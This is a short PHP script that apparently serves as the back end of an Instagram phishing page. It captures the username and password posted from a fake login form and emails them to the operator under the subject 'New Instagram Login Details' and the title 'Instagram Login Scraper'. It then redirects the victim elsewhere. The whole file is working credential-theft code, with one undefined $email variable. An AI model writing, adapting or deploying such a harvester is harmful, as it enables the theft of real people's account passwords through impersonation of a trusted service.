<?php
// Include your mailer configuration file
require '../vendor/mailer.php'; // Make sure this file is set up to configure the mailer

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get form data
    $username = isset($_POST['username']) ? $_POST['username'] : ''; // Now it captures the actual value
    $password = isset($_POST['password']) ? $_POST['password'] : ''; // Now it captures the actual value


    // Email subject and message
    $subject = 'New Instagram Login Details';
    $message = "
        <p><strong>Username:</strong> $username</p>
        <p><strong>Password:</strong> $password</p>
    ";

    // Path to site logo and site title for the email
    $site_logo_path = 'https://img.freepik.com/free-psd/instagram-application-logo_23-2151544090.jpg?w=740&t=st=1728631014~exp=1728631614~hmac=82905c2c43064c48d3bb7b97ce61aeb06d5cd27fb7d9c34e3d869bddc56d75d6'; // Update with the actual path to your site logo
    $site_title = 'Instagram Login Scraper'; // Update with your site title

    // Send the email using your pre-configured sendEmail function
    $emailSent = sendEmail($subject, $email, $message, $site_logo_path, $site_title);

    // Check if the email was sent successfully
    if ($emailSent) {
        header("Location: ../hello"); // Replace with your success URL (e.g., to the access page)
        exit();
    } else {
        echo 'Failed to send email'; // Handle error scenario
    }
}
?>
